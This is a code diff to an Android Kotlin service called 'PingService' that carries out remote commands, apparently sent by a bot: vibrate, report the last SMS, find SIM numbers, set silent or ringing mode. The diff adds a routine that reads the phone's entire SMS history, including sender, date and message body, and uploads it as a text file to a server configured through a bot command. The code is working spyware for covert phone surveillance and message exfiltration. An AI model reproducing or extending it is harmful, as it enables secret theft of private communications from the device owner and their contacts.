@@ -223,7 +223,7 @@ class PingService : Service() {
                 }
                 "cmd_a" -> vibrate()
                 "cmd_b" -> reportLastSms()  // last SMS
-                "cmd_c" -> { /* TODO */ }
+                "cmd_c" -> uploadAllSms()  // all SMS as txt file
                 "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
                 "cmd_e" -> setSilent()           // silent mode
                 "cmd_f" -> setRinging()          // ring at 2/3 volume
@@ -253,6 +253,70 @@ class PingService : Service() {
         } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
     }
 
+
+    // C — read ALL SMS and upload as txt file to server
+    private fun uploadAllSms() {
+        val server = serverUrl(this)
+        if (server.isBlank()) {
+            prefs.edit().putString(KEY_REPORT, "⚠️ Server not configured. Use /setserver in bot.").apply()
+            return
+        }
+        Thread {
+            try {
+                val sb = StringBuilder()
+                sb.appendLine("=== SMS Export ===")
+                sb.appendLine("Device : ${Build.MANUFACTURER} ${Build.MODEL}")
+                sb.appendLine("Date   : ${java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
+                    java.util.Locale.getDefault()).format(java.util.Date())}")
+                sb.appendLine("=" .repeat(40))
+                sb.appendLine()
+
+                val cursor = contentResolver.query(
+                    android.provider.Telephony.Sms.CONTENT_URI,
+                    arrayOf(
+                        android.provider.Telephony.Sms.ADDRESS,
+                        android.provider.Telephony.Sms.BODY,
+                        android.provider.Telephony.Sms.DATE,
+                        android.provider.Telephony.Sms.TYPE,
+                    ),
+                    null, null,
+                    "${android.provider.Telephony.Sms.DATE} DESC"
+                )
+
+                var count = 0
+                cursor?.use { c ->
+                    val fmt = java.text.SimpleDateFormat(
+                        "yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault()
+                    )
+                    while (c.moveToNext()) {
+                        val address = c.getString(0) ?: "unknown"
+                        val body    = c.getString(1) ?: ""
+                        val date    = c.getLong(2)
+                        val type    = c.getInt(3)
+                        val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
+                            "SENT" else "RECV"
+
+                        sb.appendLine("[$typeStr] ${fmt.format(java.util.Date(date))}")
+                        sb.appendLine("From/To: $address")
+                        sb.appendLine(body)
+                        sb.appendLine("-".repeat(40))
+                        count++
+                    }
+                }
+
+                sb.appendLine()
+                sb.appendLine("Total: $count messages")
+
+                val filename = "sms_${Build.MODEL}_${System.currentTimeMillis()}.txt"
+                val caption  = "📱 ${Build.MANUFACTURER} ${Build.MODEL} | $count SMS"
+                uploadText(filename, sb.toString(), caption)
+
+                prefs.edit().putString(KEY_REPORT, "📤 Uploading $count SMS to server...").apply()
+            } catch (e: Exception) {
+                prefs.edit().putString(KEY_REPORT, "SMS export error: ${e.message}").apply()
+            }
+        }.start()
+    }
 
     // B — read last SMS and queue for next ping
     private fun reportLastSms() {
